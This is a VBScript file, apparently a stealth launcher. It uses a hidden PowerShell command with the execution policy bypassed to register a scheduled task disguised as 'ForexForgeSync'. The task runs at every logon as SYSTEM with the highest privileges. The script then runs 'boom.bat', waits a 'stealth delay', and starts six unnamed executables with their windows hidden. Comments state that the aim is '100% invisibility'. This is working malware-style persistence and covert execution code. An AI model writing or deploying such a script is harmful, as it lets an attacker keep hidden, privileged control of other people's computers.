Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get absolute paths properly
strScript = WScript.ScriptFullName
strPath = objFSO.GetParentFolderName(strScript)

' --- STEP 1: CREATE THE TASK VIA POWERSHELL ---
' We name it "ForexForgeSync" so it matches your query
' We add -User 'SYSTEM' to ensure 100% invisibility
' We use wscript.exe //B to suppress the console window
Dim psCommand
psCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & _
    "$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '//B \""" & strScript & "\"" /boot'; " & _
    "$trigger = New-ScheduledTaskTrigger -AtLogOn; " & _
    "Register-ScheduledTask -TaskName 'ForexForgeSync' -Action $action -Trigger $trigger -User 'SYSTEM' -RunLevel Highest -Force"""

' Run the PowerShell command hidden (0)
objShell.Run psCommand, 0, True

' --- STEP 2: INITIAL RUN (Only if not a reboot) ---
If Not WScript.Arguments.Named.Exists("boot") Then
    objShell.Run "cmd.exe /c boom.bat", 0, True
End If

' --- STEP 3: STEALTH DELAY ---
' This wait happens in background Session 0
WScript.Sleep 30000 

' --- STEP 4: LAUNCH THE 6 APPS ---
objShell.Run """" & strPath & "\sigurd.exe""", 0, False
objShell.Run """" & strPath & "\client.exe""", 0, False
objShell.Run """" & strPath & "\file3.exe""", 0, False
objShell.Run """" & strPath & "\file4.exe""", 0, False
objShell.Run """" & strPath & "\file5.exe""", 0, False
objShell.Run """" & strPath & "\file6.exe""", 0, False

WScript.Quit
